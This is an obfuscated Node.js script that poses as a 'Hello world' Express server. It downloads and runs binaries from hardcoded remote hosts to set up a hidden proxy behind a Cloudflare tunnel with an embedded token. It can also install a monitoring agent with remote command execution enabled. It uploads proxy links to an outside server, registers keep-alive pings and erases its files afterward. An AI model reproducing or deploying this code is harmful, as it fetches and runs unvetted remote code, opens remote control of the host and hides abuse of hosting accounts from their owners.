const _0x315155=_0x73a8;(function(_0x16d6d0,_0x478d81){const _0x4cd039=_0x73a8,_0x3fa10b=_0x16d6d0();while(!![]){try{const _0x45a83a=-parseInt(_0x4cd039(0x259))/0x1+-parseInt(_0x4cd039(0x248))/0x2+-parseInt(_0x4cd039(0x28d))/0x3+-parseInt(_0x4cd039(0x256))/0x4*(-parseInt(_0x4cd039(0x21d))/0x5)+-parseInt(_0x4cd039(0x249))/0x6+parseInt(_0x4cd039(0x235))/0x7*(-parseInt(_0x4cd039(0x1d5))/0x8)+parseInt(_0x4cd039(0x25d))/0x9*(parseInt(_0x4cd039(0x236))/0xa);if(_0x45a83a===_0x478d81)break;else _0x3fa10b['push'](_0x3fa10b['shift']());}catch(_0x4deab4){_0x3fa10b['push'](_0x3fa10b['shift']());}}}(_0x569c,0xe10f3));const express=require(_0x315155(0x1ea)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x315155(0x245)),{promisify}=require(_0x315155(0x206)),exec=promisify(require(_0x315155(0x214))[_0x315155(0x25a)]),{execSync}=require(_0x315155(0x214)),UPLOAD_URL=process[_0x315155(0x209)][_0x315155(0x255)]||'',PROJECT_URL=process['env'][_0x315155(0x220)]||'',AUTO_ACCESS=process[_0x315155(0x209)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x315155(0x209)][_0x315155(0x26e)]||'./tmp',SUB_PATH=process['env'][_0x315155(0x27f)]||'mx',PORT=process[_0x315155(0x209)][_0x315155(0x208)]||process[_0x315155(0x209)]['PORT']||0xbb8,UUID=process[_0x315155(0x209)][_0x315155(0x22a)]||'46de78eb-c81f-4fa6-bf6e-183cf61918b6',NEZHA_SERVER=process['env'][_0x315155(0x25c)]||'',NEZHA_PORT=process[_0x315155(0x209)][_0x315155(0x284)]||'',NEZHA_KEY=process[_0x315155(0x209)][_0x315155(0x23d)]||'',ARGO_DOMAIN=process['env'][_0x315155(0x1dc)]||'t1.it2sky.org',ARGO_AUTH=process[_0x315155(0x209)][_0x315155(0x1fc)]||_0x315155(0x204),ARGO_PORT=process[_0x315155(0x209)]['ARGO_PORT']||0x1f41,CFIP=process[_0x315155(0x209)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x315155(0x209)][_0x315155(0x271)]||0x1bb,NAME=process[_0x315155(0x209)][_0x315155(0x289)]||'';!fs[_0x315155(0x201)](FILE_PATH)?(fs[_0x315155(0x1ed)](FILE_PATH),console[_0x315155(0x221)](FILE_PATH+'\x20is\x20created')):console[_0x315155(0x221)](FILE_PATH+_0x315155(0x24b));function generateRandomName(){const _0x462a90=_0x315155,_0xc27e2f=_0x462a90(0x269);let _0x309a63='';for(let _0x2c3fa5=0x0;_0x2c3fa5<0x6;_0x2c3fa5++){_0x309a63+=_0xc27e2f[_0x462a90(0x237)](Math[_0x462a90(0x23b)](Math[_0x462a90(0x1fd)]()*_0xc27e2f[_0x462a90(0x1f7)]));}return _0x309a63;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x315155(0x22d)](FILE_PATH,npmName),phpPath=path[_0x315155(0x22d)](FILE_PATH,phpName),webPath=path[_0x315155(0x22d)](FILE_PATH,webName),botPath=path[_0x315155(0x22d)](FILE_PATH,botName),subPath=path[_0x315155(0x22d)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x315155(0x278)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x315155(0x22d)](FILE_PATH,'config.json');function deleteNodes(){const _0x38dd39=_0x315155;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x533f33;try{_0x533f33=fs[_0x38dd39(0x1e4)](subPath,'utf-8');}catch{return null;}const _0x4ca604=Buffer[_0x38dd39(0x270)](_0x533f33,_0x38dd39(0x238))[_0x38dd39(0x243)](_0x38dd39(0x24c)),_0x198e33=_0x4ca604[_0x38dd39(0x267)]('\x0a')['filter'](_0x5eaabc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x38dd39(0x26d)](_0x5eaabc));if(_0x198e33['length']===0x0)return;return axios[_0x38dd39(0x21c)](UPLOAD_URL+_0x38dd39(0x27e),JSON[_0x38dd39(0x1e9)]({'nodes':_0x198e33}),{'headers':{'Content-Type':_0x38dd39(0x216)}})[_0x38dd39(0x229)](_0x265a05=>{return null;}),null;}catch(_0x42dbcf){return null;}}function cleanupOldFiles(){const _0x4b0504=_0x315155;try{const _0x551ba3=fs[_0x4b0504(0x1d6)](FILE_PATH);_0x551ba3[_0x4b0504(0x231)](_0x22a3b1=>{const _0x31c3ed=_0x4b0504,_0x59829b=path[_0x31c3ed(0x22d)](FILE_PATH,_0x22a3b1);try{const _0x1e34a2=fs[_0x31c3ed(0x1df)](_0x59829b);_0x1e34a2['isFile']()&&fs[_0x31c3ed(0x242)](_0x59829b);}catch(_0x23cbf2){}});}catch(_0x3498c7){}}app[_0x315155(0x28b)]('/',function(_0x335964,_0x3cf2f2){const _0x19e757=_0x315155;_0x3cf2f2[_0x19e757(0x21a)](_0x19e757(0x1ec));});async function generateConfig(){const _0x5567cf=_0x315155,_0x149dfa={'log':{'access':_0x5567cf(0x239),'error':'/dev/null','loglevel':_0x5567cf(0x24f)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x5567cf(0x213)}],'decryption':_0x5567cf(0x24f),'fallbacks':[{'dest':0xbb9},{'path':_0x5567cf(0x258),'dest':0xbba},{'path':_0x5567cf(0x230),'dest':0xbbb},{'path':_0x5567cf(0x218),'dest':0xbbc}]},'streamSettings':{'network':_0x5567cf(0x1db)}},{'port':0xbb9,'listen':_0x5567cf(0x26b),'protocol':_0x5567cf(0x22c),'settings':{'clients':[{'id':UUID}],'decryption':_0x5567cf(0x24f)},'streamSettings':{'network':_0x5567cf(0x1db),'security':_0x5567cf(0x24f)}},{'port':0xbba,'listen':_0x5567cf(0x26b),'protocol':_0x5567cf(0x22c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5567cf(0x24f)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5567cf(0x283),_0x5567cf(0x1ff),_0x5567cf(0x279)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5567cf(0x26b),'protocol':_0x5567cf(0x1f3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5567cf(0x230)}},'sniffing':{'enabled':!![],'destOverride':[_0x5567cf(0x283),_0x5567cf(0x1ff),_0x5567cf(0x279)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x5567cf(0x1f9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5567cf(0x24f),'wsSettings':{'path':_0x5567cf(0x218)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5567cf(0x1ff),_0x5567cf(0x279)],'metadataOnly':![]}}],'dns':{'servers':[_0x5567cf(0x287)]},'outbounds':[{'protocol':_0x5567cf(0x252),'tag':'direct'},{'protocol':_0x5567cf(0x1e1),'tag':'block'}]};fs[_0x5567cf(0x246)](path[_0x5567cf(0x22d)](FILE_PATH,_0x5567cf(0x23e)),JSON['stringify'](_0x149dfa,null,0x2));}function getSystemArchitecture(){const _0x32204f=_0x315155,_0x121e92=os['arch']();return _0x121e92===_0x32204f(0x1d8)||_0x121e92==='arm64'||_0x121e92===_0x32204f(0x228)?'arm':'amd';}function _0x569c(){const _0x2c7021=['boot.log','createWriteStream','npm\x20running\x20error:\x20','web\x20running\x20error:\x20','xtls-rprx-vision','child_process','filter','application/json','\x20-c\x20','/trojan-argo','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','send','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','post','77665dylNNv','.exe\x20>\x20nul\x202>&1','Empowerment\x20failed\x20for\x20','PROJECT_URL','log','all','2096','\x20is\x20running','clear','Empowerment\x20success\x20for\x20','ArgoDomain:','aarch64','catch','UUID','tunnel.json','vless','join','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','/vmess-argo','forEach','pipe','\x0a\x20\x20tunnel:\x20','\x20>/dev/null\x202>&1\x20&','2034991TqvrOw','10eEndeJ','charAt','base64','/dev/null','https://arm64.ssss.nyc.mn/bot','floor','8443','NEZHA_KEY','config.json','text/plain;\x20charset=utf-8','Skipping\x20adding\x20automatic\x20access\x20task','Error\x20reading\x20boot.log:','unlinkSync','toString','ARGO_DOMAIN:','path','writeFileSync','2053','3063062uGuEoL','1344882tGoykl','Subscription\x20uploaded\x20successfully','\x20already\x20exists','utf-8','platform','2087','none','response','\x20>/dev/null\x202>&1','freedom','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','UPLOAD_URL','208oFvjKH','nohup\x20','/vless-argo','1238960srzwPX','exec','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','NEZHA_SERVER','58908591qLVciu','fileUrl','https://arm64.ssss.nyc.mn/web','?security=tls&sni=','error','Error\x20downloading\x20files:','443','basename','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://oooo.serv00.net/add-url','split','\x0a\x20\x20\x0avmess://','abcdefghijklmnopqrstuvwxyz','pop','127.0.0.1','&path=%2Fvless-argo%3Fed%3D2560#','test','FILE_PATH','?encryption=none&security=tls&sni=','from','CFPORT','&fp=firefox&type=ws&host=','message','http\x20server\x20is\x20running\x20on\x20port:','unshift','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','https://arm64.ssss.nyc.mn/agent','list.txt','quic','https://amd64.ssss.nyc.mn/agent','Error\x20in\x20startserver:','match','substring','/api/delete-nodes','SUB_PATH','true','https://amd64.ssss.nyc.mn/bot','2083','http','NEZHA_PORT','includes','Content-Type','https+local://8.8.8.8/dns-query','\x22\x20>\x20/dev/null\x202>&1','NAME','\x20>\x20nul\x202>&1','get','&path=%2Ftrojan-argo%3Fed%3D2560#','5077068TLwmOY','win32','\x0a\x20\x20credentials-file:\x20','listen','close','https://amd64.ssss.nyc.mn/web','48VKGHNk','readdirSync','\x0a\x20\x20\x20\x20','arm','taskkill\x20/f\x20/im\x20','https://arm64.ssss.nyc.mn/v1','tcp','ARGO_DOMAIN','\x20-p\x20','/api/add-subscriptions','statSync','\x0a\x20\x20\x0atrojan://','blackhole','status','chmod','readFileSync','map','Error\x20executing\x20command:\x20','Unhandled\x20error\x20in\x20startserver:','https://amd64.ssss.nyc.mn/v1','stringify','express','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Hello\x20world!','mkdirSync','pkill\x20-f\x20\x22[','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','del\x20/f\x20/q\x20','Download\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','vmess','rm\x20-rf\x20','firefox','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','length','config.yaml','trojan','App\x20is\x20running','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','ARGO_AUTH','random','TunnelSecret','tls','\x20failed:\x20','existsSync','push','has','eyJhIjoiZWY0NjQ0YTIzNmYxMGIyYjE2ODdkZmVmYjY2NzQ0NDAiLCJ0IjoiODhkNWEzOTAtOGFkMi00MDczLWFiYWQtZDVjOWNkMmM5ZTNhIiwicyI6Ik1EbGpNMkZtTWpNdFpqWXhaQzAwTVdNMkxUazNNbVl0WXpoaE9URXhNRGhpWW1JMCJ9','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','util','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','SERVER_PORT','env','trim','NEZHA\x20variable\x20is\x20empty,skip\x20running','stream','Nodes\x20uploaded\x20successfully','tunnel.yml'];_0x569c=function(){return _0x2c7021;};return _0x569c();}function downloadFile(_0x1f2480,_0x179669,_0x4d850a){const _0xd6367a=_0x315155,_0x364cb4=_0x1f2480;!fs[_0xd6367a(0x201)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x4d60fa=fs[_0xd6367a(0x210)](_0x364cb4);axios({'method':_0xd6367a(0x28b),'url':_0x179669,'responseType':_0xd6367a(0x20c)})['then'](_0x15c910=>{const _0x3d5444=_0xd6367a;_0x15c910['data'][_0x3d5444(0x232)](_0x4d60fa),_0x4d60fa['on']('finish',()=>{const _0x47fa26=_0x3d5444;_0x4d60fa[_0x47fa26(0x1d3)](),console[_0x47fa26(0x221)](_0x47fa26(0x1f1)+path['basename'](_0x364cb4)+'\x20successfully'),_0x4d850a(null,_0x364cb4);}),_0x4d60fa['on'](_0x3d5444(0x261),_0x49cd48=>{const _0x5a67a6=_0x3d5444;fs['unlink'](_0x364cb4,()=>{});const _0x18d3f3=_0x5a67a6(0x1f1)+path[_0x5a67a6(0x264)](_0x364cb4)+_0x5a67a6(0x200)+_0x49cd48[_0x5a67a6(0x273)];console[_0x5a67a6(0x261)](_0x18d3f3),_0x4d850a(_0x18d3f3);});})['catch'](_0x21f0be=>{const _0x4d69df=_0xd6367a,_0x594761='Download\x20'+path[_0x4d69df(0x264)](_0x364cb4)+'\x20failed:\x20'+_0x21f0be[_0x4d69df(0x273)];console[_0x4d69df(0x261)](_0x594761),_0x4d850a(_0x594761);});}async function downloadFilesAndRun(){const _0xcb04c1=_0x315155,_0x161750=getSystemArchitecture(),_0x515dd6=getFilesForArchitecture(_0x161750);if(_0x515dd6['length']===0x0){console[_0xcb04c1(0x221)](_0xcb04c1(0x207));return;}const _0x1b452c=_0x515dd6[_0xcb04c1(0x1e5)](_0x1c27d8=>{return new Promise((_0x4a7fa0,_0x3979ab)=>{const _0x36e684=_0x73a8;downloadFile(_0x1c27d8['fileName'],_0x1c27d8[_0x36e684(0x25e)],(_0x2a2692,_0x22dd1c)=>{_0x2a2692?_0x3979ab(_0x2a2692):_0x4a7fa0(_0x22dd1c);});});});try{await Promise[_0xcb04c1(0x222)](_0x1b452c);}catch(_0x4be864){console[_0xcb04c1(0x261)](_0xcb04c1(0x262),_0x4be864);return;}function _0x236b04(_0x5d59bf){const _0x5da12c=_0xcb04c1,_0x2c7a6e=0x1fd;_0x5d59bf[_0x5da12c(0x231)](_0x56f137=>{const _0x992889=_0x5da12c;fs[_0x992889(0x201)](_0x56f137)&&fs[_0x992889(0x1e3)](_0x56f137,_0x2c7a6e,_0x48afd8=>{const _0x321077=_0x992889;_0x48afd8?console[_0x321077(0x261)](_0x321077(0x21f)+_0x56f137+':\x20'+_0x48afd8):console[_0x321077(0x221)](_0x321077(0x226)+_0x56f137+':\x20'+_0x2c7a6e[_0x321077(0x243)](0x8));});});}const _0x2e5fd8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x236b04(_0x2e5fd8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1b5bc3=NEZHA_SERVER[_0xcb04c1(0x285)](':')?NEZHA_SERVER[_0xcb04c1(0x267)](':')[_0xcb04c1(0x26a)]():'',_0x3d6750=new Set([_0xcb04c1(0x263),_0xcb04c1(0x23c),_0xcb04c1(0x223),'2087',_0xcb04c1(0x282),_0xcb04c1(0x247)]),_0x347ee2=_0x3d6750[_0xcb04c1(0x203)](_0x1b5bc3)?_0xcb04c1(0x280):'false',_0x8130a5='\x0aclient_secret:\x20'+NEZHA_KEY+_0xcb04c1(0x219)+NEZHA_SERVER+_0xcb04c1(0x1f2)+_0x347ee2+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0xcb04c1(0x246)](path[_0xcb04c1(0x22d)](FILE_PATH,_0xcb04c1(0x1f8)),_0x8130a5);const _0x4ebff6='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0xcb04c1(0x21b);try{await exec(_0x4ebff6),console['log'](phpName+_0xcb04c1(0x224)),await new Promise(_0x924172=>setTimeout(_0x924172,0x3e8));}catch(_0x4a3c35){console[_0xcb04c1(0x261)]('php\x20running\x20error:\x20'+_0x4a3c35);}}else{let _0x2a46c5='';const _0x2285d1=[_0xcb04c1(0x263),'8443','2096',_0xcb04c1(0x24e),_0xcb04c1(0x282),_0xcb04c1(0x247)];_0x2285d1[_0xcb04c1(0x285)](NEZHA_PORT)&&(_0x2a46c5='--tls');const _0x5240dc=_0xcb04c1(0x257)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0xcb04c1(0x1dd)+NEZHA_KEY+'\x20'+_0x2a46c5+_0xcb04c1(0x1f6);try{await exec(_0x5240dc),console[_0xcb04c1(0x221)](npmName+'\x20is\x20running'),await new Promise(_0x11753c=>setTimeout(_0x11753c,0x3e8));}catch(_0x4a9338){console[_0xcb04c1(0x261)](_0xcb04c1(0x211)+_0x4a9338);}}}else console['log'](_0xcb04c1(0x20b));const _0x1097e3='nohup\x20'+webPath+_0xcb04c1(0x217)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1097e3),console['log'](webName+'\x20is\x20running'),await new Promise(_0x6187ff=>setTimeout(_0x6187ff,0x3e8));}catch(_0x38b362){console['error'](_0xcb04c1(0x212)+_0x38b362);}if(fs[_0xcb04c1(0x201)](botPath)){let _0x1c2526;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x1c2526=_0xcb04c1(0x265)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1c2526='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x1c2526=_0xcb04c1(0x1ef)+FILE_PATH+_0xcb04c1(0x254)+ARGO_PORT;try{await exec(_0xcb04c1(0x257)+botPath+'\x20'+_0x1c2526+_0xcb04c1(0x234)),console[_0xcb04c1(0x221)](botName+_0xcb04c1(0x224)),await new Promise(_0x5b402a=>setTimeout(_0x5b402a,0x7d0));}catch(_0x19928a){console[_0xcb04c1(0x261)](_0xcb04c1(0x1e6)+_0x19928a);}}await new Promise(_0x35f8c9=>setTimeout(_0x35f8c9,0x1388));}function getFilesForArchitecture(_0x41f500){const _0x1b42a2=_0x315155;let _0x46ded3;_0x41f500==='arm'?_0x46ded3=[{'fileName':webPath,'fileUrl':_0x1b42a2(0x25f)},{'fileName':botPath,'fileUrl':_0x1b42a2(0x23a)}]:_0x46ded3=[{'fileName':webPath,'fileUrl':_0x1b42a2(0x1d4)},{'fileName':botPath,'fileUrl':_0x1b42a2(0x281)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x10d1ea=_0x41f500==='arm'?_0x1b42a2(0x277):_0x1b42a2(0x27a);_0x46ded3[_0x1b42a2(0x275)]({'fileName':npmPath,'fileUrl':_0x10d1ea});}else{const _0x10d028=_0x41f500===_0x1b42a2(0x1d8)?_0x1b42a2(0x1da):_0x1b42a2(0x1e8);_0x46ded3[_0x1b42a2(0x275)]({'fileName':phpPath,'fileUrl':_0x10d028});}}return _0x46ded3;}function argoType(){const _0x303fc4=_0x315155;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x303fc4(0x221)](_0x303fc4(0x22e));return;}if(ARGO_AUTH[_0x303fc4(0x285)](_0x303fc4(0x1fe))){fs[_0x303fc4(0x246)](path['join'](FILE_PATH,_0x303fc4(0x22b)),ARGO_AUTH);const _0x43e71b=_0x303fc4(0x233)+ARGO_AUTH[_0x303fc4(0x267)]('\x22')[0xb]+_0x303fc4(0x1d1)+path['join'](FILE_PATH,_0x303fc4(0x22b))+_0x303fc4(0x253)+ARGO_DOMAIN+_0x303fc4(0x1eb)+ARGO_PORT+_0x303fc4(0x205);fs[_0x303fc4(0x246)](path[_0x303fc4(0x22d)](FILE_PATH,_0x303fc4(0x20e)),_0x43e71b);}else console[_0x303fc4(0x221)](_0x303fc4(0x1fb));}function _0x73a8(_0x38d53b,_0x3bb010){const _0x569c0c=_0x569c();return _0x73a8=function(_0x73a8f3,_0x48b968){_0x73a8f3=_0x73a8f3-0x1d0;let _0x9bfe46=_0x569c0c[_0x73a8f3];return _0x9bfe46;},_0x73a8(_0x38d53b,_0x3bb010);}argoType();async function extractDomains(){const _0x4ccae6=_0x315155;let _0x17f80b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x17f80b=ARGO_DOMAIN,console[_0x4ccae6(0x221)](_0x4ccae6(0x244),_0x17f80b),await _0x503d34(_0x17f80b);else try{const _0x367b98=fs[_0x4ccae6(0x1e4)](path[_0x4ccae6(0x22d)](FILE_PATH,_0x4ccae6(0x20f)),_0x4ccae6(0x24c)),_0x3af251=_0x367b98[_0x4ccae6(0x267)]('\x0a'),_0x21e608=[];_0x3af251[_0x4ccae6(0x231)](_0x4c59dd=>{const _0x55acd1=_0x4ccae6,_0x5a7fef=_0x4c59dd[_0x55acd1(0x27c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5a7fef){const _0x4a13c6=_0x5a7fef[0x1];_0x21e608[_0x55acd1(0x202)](_0x4a13c6);}});if(_0x21e608['length']>0x0)_0x17f80b=_0x21e608[0x0],console[_0x4ccae6(0x221)](_0x4ccae6(0x227),_0x17f80b),await _0x503d34(_0x17f80b);else{console[_0x4ccae6(0x221)](_0x4ccae6(0x276)),fs['unlinkSync'](path[_0x4ccae6(0x22d)](FILE_PATH,_0x4ccae6(0x20f)));async function _0x406fd3(){const _0x5605f0=_0x4ccae6;try{process[_0x5605f0(0x24d)]===_0x5605f0(0x1d0)?await exec(_0x5605f0(0x1d9)+botName+_0x5605f0(0x21e)):await exec(_0x5605f0(0x1ee)+botName[_0x5605f0(0x237)](0x0)+']'+botName[_0x5605f0(0x27d)](0x1)+_0x5605f0(0x288));}catch(_0x5331bd){}}_0x406fd3(),await new Promise(_0x15109d=>setTimeout(_0x15109d,0xbb8));const _0x2a4491=_0x4ccae6(0x1ef)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4ccae6(0x257)+botPath+'\x20'+_0x2a4491+'\x20>/dev/null\x202>&1\x20&'),console[_0x4ccae6(0x221)](botName+'\x20is\x20running'),await new Promise(_0x33a2b8=>setTimeout(_0x33a2b8,0xbb8)),await extractDomains();}catch(_0xeb7b92){console['error'](_0x4ccae6(0x1e6)+_0xeb7b92);}}}catch(_0x1a2ee7){console[_0x4ccae6(0x261)](_0x4ccae6(0x241),_0x1a2ee7);}async function _0x503d34(_0x3dee3d){const _0x2e326f=_0x4ccae6,_0x30d15e=execSync(_0x2e326f(0x22f),{'encoding':'utf-8'}),_0x242776=_0x30d15e[_0x2e326f(0x20a)](),_0x5bdb65=NAME?NAME+'-'+_0x242776:_0x242776;return new Promise(_0x1e4339=>{setTimeout(()=>{const _0x275c9c=_0x73a8,_0x42bee1={'v':'2','ps':''+_0x5bdb65,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x275c9c(0x24f),'net':'ws','type':'none','host':_0x3dee3d,'path':'/vmess-argo?ed=2560','tls':_0x275c9c(0x1ff),'sni':_0x3dee3d,'alpn':'','fp':_0x275c9c(0x1f5)},_0x12c5d1='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x275c9c(0x26f)+_0x3dee3d+_0x275c9c(0x272)+_0x3dee3d+_0x275c9c(0x26c)+_0x5bdb65+_0x275c9c(0x268)+Buffer['from'](JSON[_0x275c9c(0x1e9)](_0x42bee1))[_0x275c9c(0x243)](_0x275c9c(0x238))+_0x275c9c(0x1e0)+UUID+'@'+CFIP+':'+CFPORT+_0x275c9c(0x260)+_0x3dee3d+_0x275c9c(0x272)+_0x3dee3d+_0x275c9c(0x28c)+_0x5bdb65+_0x275c9c(0x1d7);console['log'](Buffer[_0x275c9c(0x270)](_0x12c5d1)['toString'](_0x275c9c(0x238))),fs[_0x275c9c(0x246)](subPath,Buffer[_0x275c9c(0x270)](_0x12c5d1)[_0x275c9c(0x243)](_0x275c9c(0x238))),console[_0x275c9c(0x221)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x275c9c(0x28b)]('/'+SUB_PATH,(_0x167c8e,_0x261f8c)=>{const _0x2e8d83=_0x275c9c,_0x262a64=Buffer[_0x2e8d83(0x270)](_0x12c5d1)[_0x2e8d83(0x243)]('base64');_0x261f8c['set'](_0x2e8d83(0x286),_0x2e8d83(0x23f)),_0x261f8c[_0x2e8d83(0x21a)](_0x262a64);}),_0x1e4339(_0x12c5d1);},0x7d0);});}}async function uploadNodes(){const _0x2f5ea9=_0x315155;if(UPLOAD_URL&&PROJECT_URL){const _0x1c9ebc=PROJECT_URL+'/'+SUB_PATH,_0xcd2a8f={'subscription':[_0x1c9ebc]};try{const _0x377398=await axios[_0x2f5ea9(0x21c)](UPLOAD_URL+_0x2f5ea9(0x1de),_0xcd2a8f,{'headers':{'Content-Type':_0x2f5ea9(0x216)}});return _0x377398&&_0x377398[_0x2f5ea9(0x1e2)]===0xc8?(console[_0x2f5ea9(0x221)](_0x2f5ea9(0x24a)),_0x377398):null;}catch(_0x55dfd5){if(_0x55dfd5[_0x2f5ea9(0x250)]){if(_0x55dfd5[_0x2f5ea9(0x250)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2f5ea9(0x201)](listPath))return;const _0x3f8874=fs['readFileSync'](listPath,_0x2f5ea9(0x24c)),_0x22461a=_0x3f8874[_0x2f5ea9(0x267)]('\x0a')[_0x2f5ea9(0x215)](_0xc92616=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xc92616));if(_0x22461a[_0x2f5ea9(0x1f7)]===0x0)return;const _0x36c555=JSON['stringify']({'nodes':_0x22461a});try{const _0x2ae7af=await axios[_0x2f5ea9(0x21c)](UPLOAD_URL+'/api/add-nodes',_0x36c555,{'headers':{'Content-Type':_0x2f5ea9(0x216)}});return _0x2ae7af&&_0x2ae7af[_0x2f5ea9(0x1e2)]===0xc8?(console[_0x2f5ea9(0x221)](_0x2f5ea9(0x20d)),_0x2ae7af):null;}catch(_0x43724f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x33d0c3=_0x73a8,_0x161d94=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x161d94['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x161d94[_0x33d0c3(0x202)](phpPath);process['platform']===_0x33d0c3(0x1d0)?exec(_0x33d0c3(0x1f0)+_0x161d94[_0x33d0c3(0x22d)]('\x20')+_0x33d0c3(0x28a),_0x2ae602=>{const _0x41e8f2=_0x33d0c3;console[_0x41e8f2(0x225)](),console[_0x41e8f2(0x221)](_0x41e8f2(0x1fa)),console[_0x41e8f2(0x221)](_0x41e8f2(0x25b));}):exec(_0x33d0c3(0x1f4)+_0x161d94['join']('\x20')+_0x33d0c3(0x251),_0x4b1027=>{const _0x366ff6=_0x33d0c3;console[_0x366ff6(0x225)](),console[_0x366ff6(0x221)](_0x366ff6(0x1fa)),console[_0x366ff6(0x221)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x500ab2=_0x315155;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x500ab2(0x221)](_0x500ab2(0x240));return;}try{const _0x3619cd=await axios['post'](_0x500ab2(0x266),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x500ab2(0x216)}});return console[_0x500ab2(0x221)]('automatic\x20access\x20task\x20added\x20successfully'),_0x3619cd;}catch(_0x33abd0){return console[_0x500ab2(0x261)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x33abd0['message']),null;}}async function startserver(){const _0x3e85e3=_0x315155;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5101e1){console[_0x3e85e3(0x261)](_0x3e85e3(0x27b),_0x5101e1);}}startserver()[_0x315155(0x229)](_0x21bec7=>{const _0x5a1e3f=_0x315155;console[_0x5a1e3f(0x261)](_0x5a1e3f(0x1e7),_0x21bec7);}),app[_0x315155(0x1d2)](PORT,()=>console[_0x315155(0x221)](_0x315155(0x274)+PORT+'!'));
